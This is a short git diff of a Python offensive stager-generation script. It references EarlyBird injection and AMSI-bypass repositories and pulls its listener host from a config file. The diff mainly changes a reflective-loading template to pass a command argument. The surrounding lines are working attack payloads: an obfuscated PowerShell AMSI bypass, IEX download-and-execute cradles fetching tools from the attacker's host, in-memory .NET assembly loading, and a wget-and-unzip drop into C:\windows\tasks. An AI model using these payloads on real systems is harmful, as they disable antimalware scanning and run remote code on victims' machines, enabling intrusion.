@@ -10,8 +10,6 @@ import yaml
 # https://github.com/Kara-4search/EarlyBirdInjection_CSharp
 # https://github.com/0xB455/AmsiBypass/blob/master/Class1.cs
 
-# Hardcode LHOST if needed
-# LHOST="10.10.14.110"
 with open('config.yaml', 'r') as file:
   conf = yaml.safe_load(file)
 
@@ -23,7 +21,7 @@ WEBROOT = conf['listener']['webroot']
 STAGER_URL = f"http://{LHOST}/sc"
 PS_AMSI = r'''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'''
 PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
-PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_class}]::{entrypoint}("".Split())'''
+PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_class}]::{entrypoint}("{cmd}".Split())'''
 PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
 PS_UNZIP_CMD = "wget http://{LHOST}/{tool} -o C:\\\\windows\\\\tasks\\\\t.zip;Expand-archive -LiteralPath C:\\\\windows\\\\tasks\\\\t.zip -DestinationPath C:\\\\windows\\\\tasks\\\\"
 
